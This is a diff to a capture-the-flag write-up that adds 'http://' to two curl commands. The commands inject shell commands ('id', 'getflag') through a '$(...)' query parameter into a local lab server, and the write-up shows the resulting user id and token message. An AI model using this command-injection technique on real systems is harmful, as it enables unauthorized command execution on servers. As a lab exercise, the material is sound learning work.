@@ -42,14 +42,14 @@ By using `x = $(<command>)`, we can execute arbitrary commands on the server sid
 Using the `id` command, we can see which user has started the server.
 
 ```bash
-$ curl localhost:4747?x=\$\(id\)
+$ curl http://localhost:4747?x=\$\(id\)
 uid=3004(flag04) gid=2004(level04) groups=3004(flag04),1001(flag),2004(level04)
 ```
 
 Using the `getflag` command, we can get the flag.
 
 ```bash
-$ curl localhost:4747?x=\$\(getflag\)
+$ curl http://localhost:4747?x=\$\(getflag\)
 Check flag.Here is your token : ....
 ```
 
